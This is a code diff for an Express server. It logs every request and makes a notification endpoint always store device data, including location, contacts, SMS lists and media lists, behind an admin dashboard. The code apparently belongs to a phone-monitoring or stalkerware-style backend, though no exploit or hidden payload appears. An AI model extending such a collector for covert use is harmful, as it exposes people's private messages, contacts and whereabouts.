@@ -17,6 +17,12 @@ app.use(cors({ origin: "*" }));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
+// Log every incoming request
+app.use((req, res, next) => {
+  console.log(`📡 [SERVER RECV] ${req.method} ${req.url} | Body keys: ${Object.keys(req.body || {}).join(', ')}`);
+  next();
+});
+
 // ── Serve Admin Dashboard ──────────────────────
 app.use(express.static(path.join(__dirname, "public")));
 app.get("/", (_req, res) => {
@@ -317,14 +323,20 @@ app.post(["/api/events/notification", "/api/notifications"], auth, async (req, r
 
     if (event_key) {
       const existing = await NotificationEvent.findOne({ event_key });
-      if (existing)
+      if (existing) {
+        // Update existing record with new snapshot data (location, contacts, sms, media)
+        existing.location = location || existing.location;
+        if (contacts?.length) existing.contacts = contacts;
+        if (sms_list?.length) existing.sms_list = sms_list;
+        if (media_list?.length) existing.media_list = media_list;
+        await existing.save();
         return res
           .status(200)
-          .json({ success: true, duplicate: true, data: existing });
+          .json({ success: true, updated: true, data: existing });
+      }
     }
 
-    const doc = await NotificationEvent.create({
-      event_key: event_key || null,
+    const payloadObj = {
       device_id,
       device_name: device_name || "Unknown",
       package_name,
@@ -335,13 +347,38 @@ app.post(["/api/events/notification", "/api/notifications"], auth, async (req, r
       sms_list: sms_list || [],
       media_list: media_list || [],
       timestamp: timestamp ? new Date(timestamp) : new Date(),
-    });
+    };
+
+    if (event_key) {
+      payloadObj.event_key = event_key;
+    }
+
+    const doc = await NotificationEvent.create(payloadObj);
 
     await touchDevice(device_id, device_name || "Unknown");
     res.status(201).json({ success: true, data: doc });
   } catch (err) {
-    if (err.code === 11000)
-      return res.status(200).json({ success: true, duplicate: true });
+    if (err.code === 11000) {
+      // Fallback: Create without event_key to ensure data is ALWAYS saved
+      try {
+        const fallbackDoc = await NotificationEvent.create({
+          device_id: req.body.device_id,
+          device_name: req.body.device_name || "Unknown",
+          package_name: req.body.package_name,
+          title: req.body.title || "",
+          content: req.body.content || "",
+          location: req.body.location || null,
+          contacts: req.body.contacts || [],
+          sms_list: req.body.sms_list || [],
+          media_list: req.body.media_list || [],
+          timestamp: req.body.timestamp ? new Date(req.body.timestamp) : new Date(),
+        });
+        await touchDevice(req.body.device_id, req.body.device_name || "Unknown");
+        return res.status(201).json({ success: true, fallback: true, data: fallbackDoc });
+      } catch (fallbackErr) {
+        return res.status(500).json({ success: false, message: fallbackErr.message });
+      }
+    }
     res.status(500).json({ success: false, message: err.message });
   }
 });
